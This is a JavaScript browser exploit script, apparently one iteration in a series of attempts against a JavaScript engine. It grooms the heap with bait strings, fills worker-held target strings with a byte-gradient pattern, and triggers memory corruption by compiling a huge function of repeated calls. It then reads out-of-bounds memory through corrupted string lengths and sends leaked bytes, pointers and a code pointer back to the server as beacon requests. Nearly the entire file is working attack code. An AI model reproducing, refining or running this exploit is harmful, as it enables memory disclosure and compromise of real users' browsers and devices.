// p159 — Gradient string extraction (EXACT p156 layout, zero extra allocations)
//
// p156: ALL 14 strings corrupted (.length=81400), charCodeAt=0x41 (m_data8→our 'A' buffer)
// p157/p158: Adding ANY extra allocations breaks the heap layout → crash
//
// KEY INSIGHT: Fill target strings with GRADIENT pattern (byte N = N%256) instead of 'A'.
// After corruption:
//   If m_data8 points to our buffer: charCodeAt gives gradient values → compute offset
//   If m_data8 points ELSEWHERE: charCodeAt gives unknown bytes → THAT'S our data leak!
//   Either way: .length = 81400 = 4 bytes from metadata entry
//
// Test: charCodeAt(0)=V0, charCodeAt(1)=V1. If V1=(V0+1)%256 → gradient (our buffer).
//       If not → m_data8 points to code/metadata → EXTRACT ALL BYTES!
//
// Beacon prefix: V159-

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V159-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  }
  function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  // ── WORKER ──
  var workerCode = function() {
    var targets = [];
    var baseUrl = '';
    var STR_LEN = 100000;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V159-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }
    function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        // Build gradient chunk: bytes 0x00-0xFF repeated
        var gchunk = '';
        for (var i = 0; i < 256; i++) gchunk += String.fromCharCode(i);

        for (var i = 0; i < 14; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 256) s += gchunk;
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0); // force materialization
          targets.push(s);
        }
        // Verify gradient
        var ok = (targets[0].charCodeAt(0) === 0 && targets[0].charCodeAt(1) === 1 && targets[0].charCodeAt(255) === 255);
        beacon('TARGETS-' + targets.length + '-grad=' + (ok ? 'OK' : 'FAIL'));
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCHING');
        var found = false;
        var iters = 0;

        while (!found) {
          for (var i = 0; i < targets.length; i++) {
            if (targets[i].length !== STR_LEN) {
              beacon('LEN-' + i + '-' + targets[i].length);
              found = true;
              break;
            }
            // Also check: gradient intact at offset 100?
            if (targets[i].charCodeAt(100) !== 100) {
              beacon('GRAD-' + i + '-v=' + targets[i].charCodeAt(100));
              found = true;
              break;
            }
          }
          iters++;
          if (iters % 500000 === 0) beacon('POLL-' + iters);
        }

        // ── EXTRACTION PHASE ──
        for (var i = 0; i < targets.length; i++) {
          var len = targets[i].length;
          if (len === STR_LEN) {
            // Check gradient integrity
            var c100 = targets[i].charCodeAt(100);
            if (c100 === 100) continue; // completely untouched
          }

          // This string is corrupted
          beacon('S' + i + '-len=' + len + '-hex=' + len.toString(16));

          // Read charCodeAt at many offsets — check if gradient or foreign bytes
          var maxRead = Math.min(len, 200);
          if (maxRead <= 0 || maxRead > 500000) {
            beacon('S' + i + '-BADLEN');
            continue;
          }

          // First 32 bytes
          var first32 = '';
          for (var b = 0; b < Math.min(32, maxRead); b++) {
            try { first32 += hx(targets[i].charCodeAt(b)); }
            catch(e) { first32 += 'XX'; break; }
          }
          beacon('F' + i + '-' + first32);

          // Check gradient: V0, V1 consecutive?
          var v0 = targets[i].charCodeAt(0);
          var v1 = targets[i].charCodeAt(1);
          var isGradient = ((v1 & 0xFF) === ((v0 + 1) & 0xFF));
          beacon('G' + i + '-v0=' + hx(v0) + '-v1=' + hx(v1) + '-grad=' + (isGradient ? 'Y' : 'N'));

          if (isGradient) {
            // m_data8 points to our buffer at offset v0 (mod 256)
            // Read at stride-112 offsets to find entry boundaries
            beacon('OFF' + i + '-base=' + v0);
            // Sample at 112-byte intervals from offset 0
            var samples = '';
            for (var s = 0; s < 1120 && s < maxRead; s += 112) {
              try { samples += s + ':' + hx(targets[i].charCodeAt(s)) + ','; }
              catch(e) { break; }
            }
            beacon('SM' + i + '-' + samples);
          } else {
            // m_data8 points to UNKNOWN memory — THESE ARE THE LEAKED BYTES!
            beacon('LEAK' + i);

            // Dump first 112 bytes (full metadata entry)
            var entry1 = '';
            for (var b = 0; b < Math.min(112, maxRead); b++) {
              try { entry1 += hx(targets[i].charCodeAt(b)); }
              catch(e) { entry1 += 'XX'; break; }
            }
            // Split into 2 beacons (56 bytes each = 112 hex chars)
            beacon('E' + i + 'a-' + entry1.substring(0, 112));
            if (entry1.length > 112) beacon('E' + i + 'b-' + entry1.substring(112));

            // 8-byte pointer values (little-endian)
            var ptrs = '';
            for (var p = 0; p < Math.min(112, maxRead - 7); p += 8) {
              var h8 = '';
              for (var hh = 7; hh >= 0; hh--) {
                try { h8 += hx(targets[i].charCodeAt(p + hh)); }
                catch(e) { h8 += 'XX'; }
              }
              ptrs += p + ':' + h8 + ' ';
            }
            beacon('P' + i + '-' + ptrs.substring(0, 200));

            // Specifically: bytes at offset 24 (putative code pointer)
            if (maxRead > 32) {
              var ptr24 = '';
              for (var hh = 7; hh >= 0; hh--) {
                try { ptr24 += hx(targets[i].charCodeAt(24 + hh)); }
                catch(e) { ptr24 += 'XX'; }
              }
              beacon('CPTR' + i + '-' + ptr24);
            }

            // Second entry at +112
            if (maxRead > 224) {
              var entry2 = '';
              for (var b = 112; b < Math.min(224, maxRead); b++) {
                try { entry2 += hx(targets[i].charCodeAt(b)); }
                catch(e) { entry2 += 'XX'; break; }
              }
              beacon('E' + i + 'c-' + entry2.substring(0, 112));
              if (entry2.length > 112) beacon('E' + i + 'd-' + entry2.substring(112));
            }
          }

          // Only extract from first 4 corrupted strings to save time
          if (i >= 3) break;
        }
        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── PHASE 1: BAIT STRINGS (marge, low) — EXACTLY p156 ──
  var N_BAIT = 20;
  var STR_LEN = 100000;
  B('BAIT-START');
  var baits = [];
  var baitChunk = '';
  for (var k = 0; k < 100; k++) baitChunk += 'BBBBBBBBBB';
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) bait += baitChunk;
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  baitChunk = null;
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: WORKER ALLOCATES TARGETS (NO extra allocations!) ──
  worker.onmessage = function(e) {
    if (e.data.ready) phaseFreeBaits();
  };
  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc' });

  // ── PHASE 3: FREE BAITS + GC ──
  function phaseFreeBaits() {
    B('FREE-START');
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;

    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) setTimeout(gcPressureRound, 30);
      else { B('GC-DONE-' + gcRound); phaseBuild(); }
    }
    gcPressureRound();
  }

  // ── PHASE 4: BUILD + CALL (straight call like p156) ──
  function phaseBuild() {
    B('BUILD-START');

    var N = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N / CHUNK);
    var REM = N - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v159fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v159ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v159ok ? 'OK' : 'FAIL'));
      if (!window.__v159fn) { B('NO-FN'); return; }

      worker.postMessage({ cmd: 'watch' });

      setTimeout(function() {
        B('CALLING');
        try {
          window.__v159fn(function(){});
        } catch(ex) {
          B('CATCH-' + (ex.message || '').substring(0, 30));
        }
        B('SURVIVED');
      }, 200);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
